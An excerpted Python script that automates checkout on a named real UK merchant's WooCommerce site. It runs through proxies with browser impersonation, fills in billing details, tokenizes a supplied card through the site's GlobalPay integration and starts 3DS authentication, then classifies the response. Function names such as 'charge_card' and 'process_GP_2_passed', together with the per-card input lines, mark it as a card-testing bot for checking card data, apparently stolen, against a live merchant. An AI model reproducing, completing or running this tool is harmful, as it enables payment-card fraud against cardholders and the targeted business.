    ...
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        ...
        async with AsyncSession(impersonate="chrome139", proxies=proxies) as session:
            try:
                ...
                headers_add = {
                    "origin": "https://garagebuyinggroup.co.uk",
                    "referer": "https://garagebuyinggroup.co.uk/product/vw504-507-5w-30-ss-syntec-endurance-pro-longlife-199-ltr/",
                }
                files_add = {
                    "quantity": (None, "1"),
                    "add-to-cart": (None, "738"),
                }
                await session.post(
                    "https://garagebuyinggroup.co.uk/product/vw504-507-5w-30-ss-syntec-endurance-pro-longlife-199-ltr/",
                    headers=headers_add,
                    files=files_add,
                )
                ...
                headers_checkout = {
                    "referer": "https://garagebuyinggroup.co.uk/basket/",
                }
                resp_checkout = await session.get(
                    "https://garagebuyinggroup.co.uk/checkout/",
                ...
                sub = tools.find_between(html, 'name="subscription_nonce" value="', '"')
                ...
                if not sub or not hash_nonce or not upd:
                    return "Error", "Missing checkout nonces", False

                # Step 3: Get pbid (admin-ajax) – not crucial, but keep
                headers_pbid = {
                    "referer": "https://garagebuyinggroup.co.uk/checkout/",
                    "x-requested-with": "XMLHttpRequest",
                }
                params_pbid = {"action": "pys_get_pbid"}
                await session.get(
                    "https://garagebuyinggroup.co.uk/wp-admin/admin-ajax.php",
                    params=params_pbid,
                    headers=headers_pbid,
                )

                # Step 4: Update order review (AJAX)
                headers_update = {
                    "origin": "https://garagebuyinggroup.co.uk",
                    "referer": "https://garagebuyinggroup.co.uk/checkout/",
                ...
                current_time = fake.date_time().strftime("%Y-%m-%d %H:%M:%S")

                # Build post_data as a single string (as in original)
                post_data = (
                    ...
                    "&wc_order_attribution_session_entry=https://garagebuyinggroup.co.uk/"
                    ...
                    f"&billing_first_name={user_data['first']}"
                    f"&billing_last_name={user_data['last']}"
                    f"&billing_company={user_data['name']}"
                    "&billing_country=GB"
                    f"&billing_address_1={user_data['address']}"
                    "&billing_address_2="
                    f"&billing_city={user_data['city']}"
                    f"&billing_state={user_data['state']}"
                    f"&billing_postcode={user_data['zip']}"
                    ...
                    "&payment_method=bacs"
                    f"&subscription_nonce={sub}"
                    "&cmw_register_email=on"
                    f"&woocommerce-process-checkout-nonce={hash_nonce}"
                    ...
                    "&pys_browser_time=10-11|Friday|July"
                    "&pys_landing=https://garagebuyinggroup.co.uk/"
                    "&pys_source=direct"
                    "&pys_order_type=normal"
                    "&last_pys_landing=https://garagebuyinggroup.co.uk/"
                ...
                await session.post(
                    "https://garagebuyinggroup.co.uk/",
                    params=params_update,
                    headers=headers_update,
                    data=data_update,
                )

                # Step 5: Get order info (not used further, but keep)
                headers_order_info = {
                    "referer": "https://garagebuyinggroup.co.uk/checkout/",
                    "x-requested-with": "XMLHttpRequest",
                }
                await session.get(
                    "https://garagebuyinggroup.co.uk/wc-api/globalpayments_order_info/",
                    headers=headers_order_info,
                )

                # Step 6: Tokenize card via GlobalPay
                headers_token = {
                ...
                json_enroll = {
                    "tokenResponse": f'{{"details":{{"accountId":"TKA_d247c044ed8046b7abf86ddec3d41437","accountName":"tokenization","merchantId":"{merchant_id}","merchantName":"garagebuyinggroup","reference":"{ref}","cardholderName":"{user_data['name']}"}},"paymentReference":"{payment_id}"}}',
                    "order": {
                        "id": 0,
                        "amount": "597.60",
                        "currency": "GBP",
                ...
                resp_enroll = await session.post(
                    "https://garagebuyinggroup.co.uk/wc-api/globalpayments_threedsecure_checkenrollment/",
                ...
                # Step 8: Initiate authentication (3DS)
                headers_auth = {
                    "origin": "https://garagebuyinggroup.co.uk",
                    "referer": "https://garagebuyinggroup.co.uk/checkout/",
                    "content-type": "application/json",
                ...
                json_auth = {
                    ...
                    "order": {
                        ...
                        "billingAddress": {
                            ...
                            "streetAddress2": user_data["address"],
                            "city": user_data["city"],
                            "state": user_data["state"],
                    ...
                    "browserData": {
                        ...
                        "screenHeight": 813,
                        "screenWidth": 370,
                        "time": "2026-07-24T08:00:45.562Z",
                        "timezoneOffset": -3,
                        "userAgent": ua,
                    },
                }
                resp_auth = await session.post(
                    "https://garagebuyinggroup.co.uk/wc-api/globalpayments_threedsecure_initiateauthentication/",
                    headers=headers_auth,
                    json=json_auth,
                )
                response_text = resp_auth.text.lower()

                # Step 9: Classify using RESPONSE_MAP
...
async def process_GP_2_passed(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
